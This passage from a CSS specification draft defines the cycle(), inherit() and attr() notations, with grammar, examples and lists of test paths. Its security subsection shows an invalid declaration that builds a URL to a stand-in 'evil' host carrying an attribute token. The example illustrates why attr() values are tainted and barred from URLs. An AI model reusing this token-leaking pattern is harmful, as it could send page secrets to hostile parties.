> Note: Unlike using [@media](https://drafts.csswg.org/css-conditional-3/#at-ruledef-media)/[@supports](https://drafts.csswg.org/css-conditional-3/#at-ruledef-supports)/[@container](https://drafts.csswg.org/css-conditional-5/#at-ruledef-container) rules, which just ignore their contents when they’re false and let the cascade determine what values otherwise apply, declarations with [if()](#funcdef-if) do not roll back the cascade if the conditions are false; any fallback values must be provided inline. However, see the [revert-rule](https://drafts.csswg.org/css-cascade-5/#valdef-all-revert-rule) [CSS-wide keyword](https://drafts.csswg.org/css-values-4/#css-wide-keywords).

<a id="ref-for-funcdef-cycle"></a>

### <a id="cycle-notation"></a>8.4. <a id="toggle-notation"></a> Toggling Between Values: the [cycle()](#funcdef-cycle) notation

The <a id="funcdef-cycle"></a>cycle() expression allows descendant elements to cycle over a list of values instead of inheriting the same value.

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-5f10b9f5"></a> The following example makes `<em>` elements italic in general, but makes them normal if they’re inside something that’s italic:
>
> ```text
> em { font-style: cycle(italic, normal); }
> ```
<a id="ref-for-value-def-disc"></a>

<a id="ref-for-value-def-circle"></a>

<a id="ref-for-value-def-square"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-ae61c068"></a> The following example cycles markers for nested lists, so that a top level list has [disc](https://drafts.csswg.org/css2/#value-def-disc)-shaped markers, but nested lists use [circle](https://drafts.csswg.org/css2/#value-def-circle), then [square](https://drafts.csswg.org/css2/#value-def-square), then box, and then repeat through the list of marker shapes, starting again (for the 5th list deep) with <a id="ref-for-value-def-disc①"></a>disc.
>
> ```text
> ul { list-style-type: cycle(disc, circle, square, box); }
> ```
<a id="ref-for-funcdef-cycle①"></a>

The syntax of the [cycle()](#funcdef-cycle) expression is:

<a id="ref-for-funcdef-cycle②"></a>

<a id="ref-for-whole-value①⑥"></a>

<a id="ref-for-mult-comma①⓪"></a>

```text
<cycle()> = cycle( <whole-value># )
```
<a id="ref-for-funcdef-cycle③"></a>

<a id="ref-for-whole-value①⑦"></a>

<a id="ref-for-funcdef-attr②"></a>

<a id="ref-for-funcdef-calc⑤"></a>

The [cycle()](#funcdef-cycle) notation is a [\<whole-value\>](#whole-value). However, it is not allowed to be nested, nor may it contain [attr()](#funcdef-attr) or [calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc) notations; declarations containing such constructs are invalid.

<a id="ref-for-funcdef-cycle④"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-d0b77940"></a> The following [cycle()](#funcdef-cycle) examples are all invalid:
>
> ```text
> background-position: 10px cycle(50px, 100px);
> /* cycle() must be the sole value of the property */
> 
> list-style-type: cycle(disc, 50px);
> /* ''50px'' isn't a valid value of 'list-style-type' */
> ```
<a id="ref-for-funcdef-cycle⑤"></a>

<a id="ref-for-inherited-value"></a>

To determine the computed value of [cycle()](#funcdef-cycle), first evaluate each argument as if it were the sole value of the property in which <a id="ref-for-funcdef-cycle⑥"></a>cycle() is placed to determine the computed value that each represents, called <var>C<sub>n</sub></var> for the <var>n</var>-th argument to <a id="ref-for-funcdef-cycle⑦"></a>cycle(). Then, compare the property’s [inherited value](https://drafts.csswg.org/css-cascade-5/#inherited-value) with each <var>C<sub>n</sub></var>. For the earliest <var>C<sub>n</sub></var> that matches the <a id="ref-for-inherited-value①"></a>inherited value, the computed value of <a id="ref-for-funcdef-cycle⑧"></a>cycle() is <var>C<sub>n+1</sub></var>. If the match was the last argument in the list, or there was no match, the computed value of <a id="ref-for-funcdef-cycle⑨"></a>cycle() is the computed value that the first argument represents.

<a id="ref-for-funcdef-cycle①⓪"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: This means that repeating values in a [cycle()](#funcdef-cycle) short-circuits the list. For example cycle(1em, 2em, 1em, 4em) will be equivalent to cycle(1em, 2em).

<a id="ref-for-funcdef-cycle①①"></a>

<a id="ref-for-valdef-all-inherit"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: That [cycle()](#funcdef-cycle) explicitly looks at the computed value of the parent, so it works even on non-inherited properties. This is similar to the [inherit](https://drafts.csswg.org/css-cascade-5/#valdef-all-inherit) keyword, which works even on non-inherited properties.

<a id="ref-for-computed-value⑦"></a>

<a id="ref-for-propdef-background-position⑦"></a>

<a id="ref-for-propdef-background-position⑧"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: The [computed value](https://drafts.csswg.org/css-cascade-5/#computed-value) of a property is an abstract set of values, not a particular serialization [\[CSS21\]](#biblio-css21), so comparison between computed values should always be unambiguous and have the expected result. For example, a Level 2 [background-position](https://drafts.csswg.org/css2/#propdef-background-position) computed value is just two offsets, each represented as an absolute length or a percentage, so the declarations [background-position: top center](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-position) and <a id="ref-for-propdef-background-position⑨"></a>background-position: 50% 0% produce identical computed values. If the "Computed Value" line of a property definition seems to define something ambiguous or overly strict, please [provide feedback](#sotd) so we can fix it.

<a id="ref-for-funcdef-cycle①②"></a>

<a id="ref-for-shorthand-property"></a>

If [cycle()](#funcdef-cycle) is used on a [shorthand property](https://drafts.csswg.org/css-cascade-5/#shorthand-property), it sets each of its longhands to a <a id="ref-for-funcdef-cycle①③"></a>cycle() value with arguments corresponding to what the longhand would have received had each of the original <a id="ref-for-funcdef-cycle①④"></a>cycle() arguments been the sole value of the <a id="ref-for-shorthand-property①"></a>shorthand.

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-628c19d5"></a> For example, the following shorthand declaration:
>
> ```text
> margin: cycle(1px 2px, 4px, 1px 5px 4px);
> ```
>
> is equivalent to the following longhand declarations:
>
> ```text
> margin-top:    cycle(1px, 4px, 1px);
> margin-right:  cycle(2px, 4px, 5px);
> margin-bottom: cycle(1px, 4px, 4px);
> margin-left:   cycle(2px, 4px, 5px);
> ```
>
> Note that, since 1px appears twice in the top margin and 4px appears twice in bottom margin, they will cycle between only two values while the left and right margins cycle through three. In other words, the declarations above will yield the same computed values as the longhand declarations below:
>
> ```text
> margin-top:    cycle(1px, 4px);
> margin-right:  cycle(2px, 4px, 5px);
> margin-bottom: cycle(1px, 4px);
> margin-left:   cycle(2px, 4px, 5px);
> ```
>
> which may not be what was intended.

<a id="ref-for-funcdef-var④"></a>

### <a id="var-notation"></a>8.5.  Custom Property References: the [var()](https://drafts.csswg.org/css-variables-2/#funcdef-var) notation

<a id="ref-for-funcdef-var⑤"></a>

<a id="ref-for-custom-property"></a>

The [var()](https://drafts.csswg.org/css-variables-2/#funcdef-var) notation substitutes the value of a [custom property](https://drafts.csswg.org/css-variables-2/#custom-property), see the [CSS Custom Properties for Cascading Variables Module](https://www.w3.org/TR/css-variables/#using-variables). [\[CSS-VARIABLES\]](#biblio-css-variables)

<a id="ref-for-funcdef-inherit"></a>

### <a id="inherit-notation"></a>8.6.  Inherited Value References: the [inherit()](#funcdef-inherit) notation

<strong>Source test references</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-values/inherit-function-basic.html`
- `css/css-values/inherit-function-invalidation.html`
- `css/css-values/inherit-function-parsing.html`

<a id="ref-for-valdef-all-inherit①"></a>

<a id="ref-for-functional-notation⑥"></a>

<a id="ref-for-computed-value⑧"></a>

<a id="ref-for-component-value③"></a>

<a id="ref-for-guaranteed-invalid-value②"></a>

Like the [inherit](https://drafts.csswg.org/css-cascade-5/#valdef-all-inherit) keyword, the <a id="funcdef-inherit"></a>inherit() [functional notation](https://drafts.csswg.org/css-values-4/#functional-notation) resolves to the [computed value](https://drafts.csswg.org/css-cascade-5/#computed-value) of a property on the parent. Rather than resolving to the value of the same property, however, it resolves to a sequence of [component values](https://drafts.csswg.org/css-syntax-3/#component-value) representing the <a id="ref-for-computed-value⑨"></a>computed value of the property specified as its first argument. Its second argument, if present, is used as a fallback in case the first argument resolves to the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value).

<a id="ref-for-funcdef-inherit①"></a>

<a id="ref-for-arbitrary-substitution-function②"></a>

[inherit()](#funcdef-inherit) is an [arbitrary substitution function](#arbitrary-substitution-function) whose syntax is defined as:

<a id="ref-for-funcdef-inherit②"></a>

<a id="ref-for-typedef-custom-property-name"></a>

<a id="ref-for-comb-comma②①"></a>

<a id="ref-for-typedef-declaration-value①⑥"></a>

<a id="ref-for-mult-opt③⑤"></a>

```text
<inherit()> = inherit( <custom-property-name>, <declaration-value>? )
```
<a id="ref-for-funcdef-inherit③"></a>

<a id="ref-for-argument-grammar①"></a>

The [inherit()](#funcdef-inherit) function’s [argument grammar](#argument-grammar) is:

<a id="typedef-inherit-args"></a>

<a id="ref-for-typedef-inherit-args"></a>

<a id="ref-for-typedef-declaration-value①⑦"></a>

<a id="ref-for-comb-comma②②"></a>

<a id="ref-for-typedef-declaration-value①⑧"></a>

<a id="ref-for-mult-opt③⑥"></a>

```text
<inherit-args> = inherit( <declaration-value>, <declaration-value>? )
```
<a id="ref-for-funcdef-var⑥"></a>

<a id="ref-for-typedef-declaration-value①⑨"></a>

Like [var()](https://drafts.csswg.org/css-variables-2/#funcdef-var), a bare comma can be used with nothing following it, indicating that the second [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) was passed, just as an empty sequence.

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: That is, inherit(--foo) does not pass a fallback value, but inherit(--foo,) does (the fallback is just empty).

<a id="ref-for-replace-an-arbitrary-substitution-function①"></a>

To <a id="replace-an-inherit-function"></a>[replace an inherit() function](#replace-an-arbitrary-substitution-function), given a list of <var>arguments</var>:

1.  <a id="ref-for-substitute-arbitrary-substitution-function③"></a>

    <a id="ref-for-typedef-declaration-value②⓪"></a>

    <a id="ref-for-css-parse-something-according-to-a-css-grammar⑤"></a>

    <a id="ref-for-typedef-custom-property-name①"></a>

    [Substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in the first [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) of <var>arguments</var>, then [parse](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) it as a [\<custom-property-name\>](https://drafts.csswg.org/css-variables-2/#typedef-custom-property-name).

2.  <a id="ref-for-typedef-custom-property-name②"></a>

    <a id="ref-for-inherited-value②"></a>

    <a id="ref-for-custom-property①"></a>

    <a id="ref-for-guaranteed-invalid-value③"></a>

    If parsing returned a [\<custom-property-name\>](https://drafts.csswg.org/css-variables-2/#typedef-custom-property-name), and the [inherited value](https://drafts.csswg.org/css-cascade-5/#inherited-value) of that [custom property](https://drafts.csswg.org/css-variables-2/#custom-property) on the element does not contain the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value), return that inherited value.

3.  <a id="ref-for-typedef-declaration-value②①"></a>

    <a id="ref-for-substitute-arbitrary-substitution-function④"></a>

    Otherwise, if a second [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value)? was passed in <var>arguments</var>, [substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in that argument, and return the result.

4.  <a id="ref-for-guaranteed-invalid-value④"></a>

    Otherwise, return the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value).

<a id="ref-for-funcdef-inherit④"></a>

<a id="ref-for-computed-value①⓪"></a>

<a id="ref-for-used-value⑧"></a>

<a id="ref-for-dom-window-getcomputedstyle"></a>

<a id="ref-for-valdef-width-auto"></a>

<a id="ref-for-length-value⑧"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: Future levels of CSS may allow specifying standard CSS properties in [inherit()](#funcdef-inherit); however because the tokenization of [computed values](https://drafts.csswg.org/css-cascade-5/#computed-value) is not fully standardized for all CSS properties, this feature is deferred from Level 5. Note that the <a id="ref-for-computed-value①①"></a>computed value differs from the [used value](https://drafts.csswg.org/css-cascade-5/#used-value), and is not always the resolved value returned by <code><a href="https://drafts.csswg.org/cssom-1/#dom-window-getcomputedstyle">getComputedStyle()</a></code>; thus even if inherit(width) were allowed, it would frequently return the keyword [auto](https://drafts.csswg.org/css-sizing-3/#valdef-width-auto), not the used [\<length\>](https://drafts.csswg.org/css-values-4/#length-value).

<a id="ref-for-funcdef-attr③"></a>

### <a id="attr-notation"></a>8.7.  Attribute References: the [attr()](#funcdef-attr) notation

<a id="ref-for-concept-attribute"></a>

<a id="ref-for-concept-element"></a>

<a id="ref-for-funcdef-var⑦"></a>

<a id="ref-for-custom-property②"></a>

The <a id="funcdef-attr"></a>attr() function substitutes the value of an [attribute](https://dom.spec.whatwg.org/#concept-attribute) on an [element](https://dom.spec.whatwg.org/#concept-element) into a property, similar to how the [var()](https://drafts.csswg.org/css-variables-2/#funcdef-var) function substitutes a [custom property](https://drafts.csswg.org/css-variables-2/#custom-property) value into a function.

<a id="ref-for-typedef-attr-name"></a>

<a id="ref-for-typedef-attr-type"></a>

<a id="ref-for-mult-opt③⑦"></a>

<a id="ref-for-comb-comma②③"></a>

<a id="ref-for-typedef-declaration-value②②"></a>

<a id="ref-for-mult-opt③⑧"></a>

<a id="typedef-attr-name"></a>

<a id="ref-for-typedef-ident-token"></a>

<a id="ref-for-mult-opt③⑨"></a>

<a id="ref-for-mult-opt④⓪"></a>

<a id="ref-for-typedef-ident-token①"></a>

<a id="typedef-attr-type"></a>

<a id="funcdef-attr-type"></a>

<a id="ref-for-typedef-syntax①③"></a>

<a id="ref-for-comb-one①⓪①"></a>

<a id="ref-for-comb-one①⓪②"></a>

<a id="ref-for-comb-one①⓪③"></a>

<a id="ref-for-typedef-attr-unit"></a>

<a id="typedef-attr-unit"></a>

<a id="ref-for-identifier-value"></a>

```text
attr() = attr( <attr-name> <attr-type>? , <declaration-value>?)

<attr-name> = [ <ident-token>? '|' ]? <ident-token>
<attr-type> = type( <syntax> ) | raw-string | number | <attr-unit>
<attr-unit> = <custom-ident>
```
<a id="ref-for-funcdef-attr④"></a>

<a id="ref-for-argument-grammar②"></a>

The [attr()](#funcdef-attr) function’s [argument grammar](#argument-grammar) is:

<a id="typedef-attr-args"></a>

<a id="ref-for-typedef-attr-args"></a>

<a id="ref-for-typedef-declaration-value②③"></a>

<a id="ref-for-comb-comma②④"></a>

<a id="ref-for-typedef-declaration-value②④"></a>

<a id="ref-for-mult-opt④①"></a>

```text
<attr-args> = attr( <declaration-value>, <declaration-value>? )
```
<strong>Source test references</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-values/attr-IACVT.html`
- `css/css-values/attr-all-types.html`
- `css/css-values/attr-argument-grammar.html`
- `css/css-values/attr-color-invalid-cast.html`
- `css/css-values/attr-color-valid.html`
- `css/css-values/attr-container-style-query.html`
- `css/css-values/attr-crash.html`
- `css/css-values/attr-css-wide-keywords.html`
- `css/css-values/attr-cycle.html`
- `css/css-values/attr-dynamic-marker-content.html`
- `css/css-values/attr-in-max.html`
- `css/css-values/attr-in-slotted.html`
- `css/css-values/attr-invalidation.html`
- `css/css-values/attr-length-invalid-cast.html`
- `css/css-values/attr-length-specified.html`
- `css/css-values/attr-length-valid-zero-nofallback.html`
- `css/css-values/attr-length-valid-zero.html`
- `css/css-values/attr-length-valid.html`
- `css/css-values/attr-namespace-case-sensitivity.xhtml`
- `css/css-values/attr-namespace-non-existing.html`
- `css/css-values/attr-namespace-valid.xhtml`
- `css/css-values/attr-namespace-wildcard.html`
- `css/css-values/attr-notype-fallback.html`
- `css/css-values/attr-null-namespace.xhtml`
- `css/css-values/attr-pseudo-elem-invalidation-2.html`
- `css/css-values/attr-pseudo-elem-invalidation.html`
- `css/css-values/attr-pseudo-element-marker.html`
- `css/css-values/attr-pseudo-element-originating.html`
- `css/css-values/attr-pseudo-element-placeholder.html`
- `css/css-values/attr-revert-rule.html`
- `css/css-values/attr-serialization.html`
- `css/css-values/attr-style-sharing-1.html`
- `css/css-values/attr-style-sharing-2.html`
- `css/css-values/attr-style-sharing-3.html`
- `css/css-values/attr-style-sharing-4.html`
- `css/css-values/attr-style-sharing-5.html`
- `css/css-values/attr-universal-selector.html`
- `css/css-values/html-attr-case-insensitivity.html`

<a id="ref-for-funcdef-var⑧"></a>

<a id="ref-for-typedef-declaration-value②⑤"></a>

Like [var()](https://drafts.csswg.org/css-variables-2/#funcdef-var), a bare comma can be used with nothing following it, indicating that the second [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) was passed, just as an empty sequence.

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: That is, attr(foo) does not pass a fallback value, but attr(foo,) does (the fallback is just empty).

<a id="ref-for-typedef-attr-unit①"></a>

<a id="ref-for-css-css-identifier①"></a>

<a id="ref-for-ascii-case-insensitive"></a>

<a id="ref-for-px"></a>

<a id="ref-for-typedef-delim-token③"></a>

<a id="ref-for-identifier-value①"></a>

[\<attr-unit\>](#typedef-attr-unit) is intended to represents an [identifier](https://drafts.csswg.org/css-values-4/#css-css-identifier) that is an [ASCII case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for the name of a CSS dimension unit, such as [px](https://drafts.csswg.org/css-values-4/#px), or the [\<delim-token\>](https://drafts.csswg.org/css-syntax-3/#typedef-delim-token) %. As this set expands regularly, it is actually specified as a [\<custom-ident\>](https://drafts.csswg.org/css-values-4/#identifier-value), and triggers fallback behavior when it doesn’t match a known unit (rather than making the function invalid).

<a id="ref-for-funcdef-attr⑤"></a>

The arguments of [attr()](#funcdef-attr) are:

<a id="ref-for-typedef-attr-name①"></a>

[\<attr-name\>](#typedef-attr-name)

Gives the name of the attribute being referenced, similar to \<wq-name\> (from [\[SELECTORS-3\]](#biblio-selectors-3)) but without the possibility of a wildcard prefix.

<a id="ref-for-typedef-attr-name②"></a>

<a id="ref-for-attribute-selector"></a>

If no namespace is specified (just an identifier is given, like attr(foo)), the null namespace is implied. (This is usually what’s desired, as namespaced attributes are rare. In particular, HTML and SVG do not contain namespaced attributes.) Unless otherwise specified, the case-sensitivity/matching rules of [\<attr-name\>](#typedef-attr-name) are identical to [attribute selectors](https://drafts.csswg.org/selectors-4/#attribute-selector) (and thus might depend on the host language).

<a id="ref-for-typedef-attr-name③"></a>

Whitespace is not allowed between any of the components of [\<attr-name\>](#typedef-attr-name).

<a id="ref-for-funcdef-attr⑥"></a>

<a id="ref-for-pseudo-element"></a>

<a id="ref-for-originating-element"></a>

If [attr()](#funcdef-attr) is used in a property applied to an element, it references the attribute of the given name on that element; if applied to a [pseudo-element](https://drafts.csswg.org/selectors-4/#pseudo-element), the attribute is looked up on the pseudo-element’s [originating element](https://drafts.csswg.org/selectors-4/#originating-element).

<a id="ref-for-typedef-attr-type①"></a>

[\<attr-type\>](#typedef-attr-type)

<a id="ref-for-css-parse-something-according-to-a-css-grammar⑥"></a>

Specifies how the attribute value is [parsed](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) into a CSS value.

<a id="ref-for-funcdef-attr-type"></a>

<a id="ref-for-typedef-syntax①④"></a>

<a id="ref-for-typedef-syntax-single-component②"></a>

If given as a [type()](#funcdef-attr-type) function, the value is parsed according to the [\<syntax\>](#typedef-syntax) argument, and substitutes as the resulting tokens. For this purpose, \<url\> is invalid as a [\<syntax-single-component\>](#typedef-syntax-single-component). Values that fail to parse according to the syntax trigger fallback.

<a id="ref-for-funcdef-attr⑦"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: \<url\> is banned because, for now, [attr()](#funcdef-attr) values can’t be used in URLs at all due to security concerns.

<a id="ref-for-strip-leading-and-trailing-ascii-whitespace"></a>

<a id="ref-for-css-parse-something-according-to-a-css-grammar⑦"></a>

<a id="ref-for-typedef-number-token"></a>

If given as the number keyword, it causes the attribute’s literal value, after [stripping leading and trailing whitespace](https://infra.spec.whatwg.org/#strip-leading-and-trailing-ascii-whitespace), to be [parsed](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) as a [\<number-token\>](https://drafts.csswg.org/css-syntax-3/#typedef-number-token). Values that fail to parse trigger fallback.

<a id="ref-for-typedef-attr-unit②"></a>

If given as an [\<attr-unit\>](#typedef-attr-unit) value, the value is first parsed as if number keyword was specified; if this fails to parse, it triggers fallback. Then, if the <a id="ref-for-typedef-attr-unit③"></a>\<attr-unit\> value matches a known CSS unit name or is %, the number is turned into a dimension or percentage with that value and the given unit. If the <a id="ref-for-typedef-attr-unit④"></a>\<attr-unit\> does not match a known CSS unit, it triggers fallback.

If given as the raw-string keyword, or omitted entirely, it causes the attribute’s literal value to be treated as the value of a CSS string, with no CSS parsing performed at all (including CSS escapes, whitespace removal, comments, etc). No value triggers fallback; only the lack of the attribute entirely does.

<a id="ref-for-string-value⑥"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: This is different from specifying a syntax of type(\*), which still triggers CSS parsing (but with no requirements placed on it beyond that it parse validly), and which substitutes the result of that parsing directly as tokens, rather than as a [\<string\>](https://drafts.csswg.org/css-values-4/#string-value) value.

<a id="ref-for-typedef-declaration-value②⑥"></a>

[\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value)

<a id="ref-for-funcdef-attr⑧"></a>

Specifies a fallback value for the [attr()](#funcdef-attr), which will be substituted instead of the attribute’s value if the attribute is missing or fails to parse as the specified type.

<a id="ref-for-typedef-attr-type②"></a>

<a id="ref-for-guaranteed-invalid-value⑤"></a>

If the [\<attr-type\>](#typedef-attr-type) argument is omitted, the fallback defaults to the empty string if omitted; otherwise, it defaults to the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value) if omitted.

<a id="ref-for-funcdef-attr⑨"></a>

<a id="ref-for-substitute-arbitrary-substitution-function⑤"></a>

If a property contains one or more [attr()](#funcdef-attr) functions, and those functions are syntactically valid, the entire property’s grammar must be assumed to be valid at parse time. It is only syntax-checked at computed-value time, after <a id="ref-for-funcdef-attr①⓪"></a>attr() functions have been [substituted](#substitute-arbitrary-substitution-function).

<a id="ref-for-propdef-width"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note that the default value need not be of the type given. For instance, if the type required of the attribute by the author is \<length\>, the default could still be auto, like in [width: attr(size \<length\>, auto);](https://drafts.csswg.org/css-sizing-3/#propdef-width).

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-eeda89e8"></a> This example shows the use of attr() to visually illustrate data in an XML file:
>
> ```text
> <stock>
>   <wood length="12"/>
>   <wood length="5"/>
>   <metal length="19"/>
>   <wood length="4"/>
> </stock>
> 
> stock::before {
>   display: block;
>   content: "To scale, the lengths of materials in stock are:";
> }
> stock > * {
>   display: block;
>   width: attr(length em, 0px);
>   height: 1em;
>   border: solid thin;
>   margin: 0.5em;
> }
> wood {
>   background: orange url(wood.png);
> }
> metal {
>   background: silver url(metal.png);
> }
> ```
#### <a id="attr-substitution"></a>8.7.1.  Substitution

<a id="ref-for-funcdef-attr①①"></a>

<a id="ref-for-arbitrary-substitution-function③"></a>

<a id="ref-for-funcdef-var⑨"></a>

<a id="ref-for-computed-value①②"></a>

<a id="ref-for-guaranteed-invalid-value⑥"></a>

<a id="ref-for-invalid-at-computed-value-time①"></a>

[attr()](#funcdef-attr) is an [arbitrary substitution function](#arbitrary-substitution-function), similar to [var()](https://drafts.csswg.org/css-variables-2/#funcdef-var), and so is replaced with the value it represents (if possible) at [computed value](https://drafts.csswg.org/css-cascade-5/#computed-value) time; otherwise, it’s replaced with the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value), which will make its declaration [invalid at computed-value time](#invalid-at-computed-value-time).

<a id="ref-for-replace-an-arbitrary-substitution-function②"></a>

To <a id="replace-an-attr-function"></a>[replace an attr() function](#replace-an-arbitrary-substitution-function), given a list of <var>arguments</var>:

1.  <a id="ref-for-funcdef-attr①②"></a>

    <a id="ref-for-typedef-declaration-value②⑦"></a>

    Let <var>el</var> be the element that the style containing the [attr()](#funcdef-attr) function is being applied to. Let <var>first arg</var> be the first [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) in <var>arguments</var>. Let <var>second arg</var> be the <a id="ref-for-typedef-declaration-value②⑧"></a>\<declaration-value\>? passed after the comma, or null if there was no comma.

2.  <a id="ref-for-substitute-arbitrary-substitution-function⑥"></a>

    <a id="ref-for-css-parse-something-according-to-a-css-grammar⑧"></a>

    <a id="ref-for-typedef-attr-name④"></a>

    <a id="ref-for-typedef-attr-type③"></a>

    <a id="ref-for-typedef-attr-type④"></a>

    [Substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in <var>first arg</var>, then [parse](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) it as [\<attr-name\>](#typedef-attr-name) [\<attr-type\>](#typedef-attr-type)?. If that returns failure, jump to the last step (labeled FAILURE). Otherwise, let <var>attr name</var> and <var>syntax</var> be the results of parsing (with <var>syntax</var> being null if [\<attr-type\>](#typedef-attr-type) was omitted), processed as specified in the definition of those arguments.

3.  If <var>attr name</var> exists as an attribute on <var>el</var>, let <var>attr value</var> be its value; otherwise jump to the last step (labeled FAILURE).

4.  <a id="ref-for-typedef-attr-unit⑤"></a>

    <a id="ref-for-typedef-attr-type⑤"></a>

    If <var>syntax</var> is the keyword number or an [\<attr-unit\>](#typedef-attr-unit) value, parse <var>attr value</var> against [\<attr-type\>](#typedef-attr-type). If that succeeds, return the result; otherwise, jump to the last step (labeled FAILURE).

    > <strong data-conversion-semantic="note">Note</strong>
    >
    > Note: No parsing or modification of any kind is performed on the value.

5.  <a id="ref-for-string-value⑦"></a>

    If <var>syntax</var> is null or the keyword raw-string, return a CSS [\<string\>](https://drafts.csswg.org/css-values-4/#string-value) whose value is <var>attr value</var>.

    > <strong data-conversion-semantic="note">Note</strong>
    >
    > Note: No parsing or modification of any kind is performed on the value.

6.  <a id="ref-for-substitute-arbitrary-substitution-function⑦"></a>

    <a id="ref-for-substitution-context②"></a>

    <a id="ref-for-parse-with-a-syntax①"></a>

    [Substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in <var>attr value</var>, with «"attribute", <var>attr name</var>» as the [substitution context](#substitution-context), then [parse with a \<syntax\>](#parse-with-a-syntax) <var>attr value</var>, with <var>syntax</var> and <var>el</var>. If that succeeds, return the result; otherwise, jump to the last step (labeled FAILURE).

7.  <b>FAILURE:</b>

    1.  <a id="ref-for-string-value⑧"></a>

        If <var>second arg</var> is null, and <var>syntax</var> was omitted, return an empty CSS [\<string\>](https://drafts.csswg.org/css-values-4/#string-value).

    2.  <a id="ref-for-guaranteed-invalid-value⑦"></a>

        If <var>second arg</var> is null, return the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value).

    3.  <a id="ref-for-substitute-arbitrary-substitution-function⑧"></a>

        [Substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in <var>second arg</var>, and return the result.

#### <a id="attr-security"></a>8.7.2.  Security

<strong>Source test references</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-values/attr-security-animation.html`
- `css/css-values/attr-security-if.html`
- `css/css-values/attr-security-transition.html`
- `css/css-values/attr-security.html`
- `css/css-values/attr-security-transition-interpolated.html`

<a id="ref-for-funcdef-attr①③"></a>

An [attr()](#funcdef-attr) function can reference attributes that were never intended by the page to be used for styling, and might contain sensitive information (for example, a security token used by scripts on the page).

<a id="ref-for-funcdef-attr①④"></a>

In general, this is fine. It is difficult to use [attr()](#funcdef-attr) to extract information from a page and send it to a hostile party, in most circumstances. The exception to this is URLs. If a URL can be constructed with the value of an arbitrary attribute, purely from CSS, it can easily send any information stored in attributes to a hostile party, if 3rd-party CSS is allowed at all.

<a id="ref-for-funcdef-attr①⑤"></a>

<a id="ref-for-attr-taint"></a>

To guard against this, the values produced by an [attr()](#funcdef-attr) are considered <a id="attr-taint"></a>attr()-tainted, as are functions that contain an [attr()-tainted](#attr-taint) value.

<a id="ref-for-arbitrary-substitution-function④"></a>

<a id="ref-for-attr-taint①"></a>

<a id="ref-for-equivalent-token-sequence"></a>

<a id="ref-for-registered-custom-property②"></a>

The substitution value of an [arbitrary substitution function](#arbitrary-substitution-function) is [attr()-tainted](#attr-taint) <em>as a whole</em> if any <a id="ref-for-attr-taint②"></a>attr()-tainted values were involved in creating that substitution value. <strong data-conversion-semantic="note">Note:</strong> This extends to the [equivalent token sequence](https://drafts.css-houdini.org/css-properties-values-api-1/#equivalent-token-sequence) when substituting values of [registered custom properties](https://drafts.css-houdini.org/css-properties-values-api-1/#registered-custom-property).

<a id="ref-for-attr-taint③"></a>

<a id="ref-for-url-value③"></a>

<a id="ref-for-invalid-at-computed-value-time②"></a>

Using an [attr()-tainted](#attr-taint) value as or in a [\<url\>](https://drafts.csswg.org/css-values-4/#url-value) makes a declaration [invalid at computed-value time](#invalid-at-computed-value-time).

<a id="ref-for-invalid-at-computed-value-time③"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-21e44dca"></a> For example, all of the following are [invalid at computed-value time](#invalid-at-computed-value-time):
>
> - <a id="ref-for-propdef-background-image"></a>
>
>   [background-image: src(attr(foo));](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-image) - can’t use it directly.
>
> - <a id="ref-for-propdef-background-image①"></a>
>
>   <a id="ref-for-url-value④"></a>
>
>   [background-image: image(attr(foo))](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-image) - can’t use it in other [\<url\>](https://drafts.csswg.org/css-values-4/#url-value)-taking functions.
>
> - <a id="ref-for-propdef-background-image②"></a>
>
>   [background-image&#x3A; src(string("http&#x3A;&#x2F;&#x2F;example&#x2E;com&#x2F;evil?token=" attr(foo)))](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-image) - can’t "launder" it thru another function&#x2E;
>
> - <a id="ref-for-registered-custom-property③"></a>
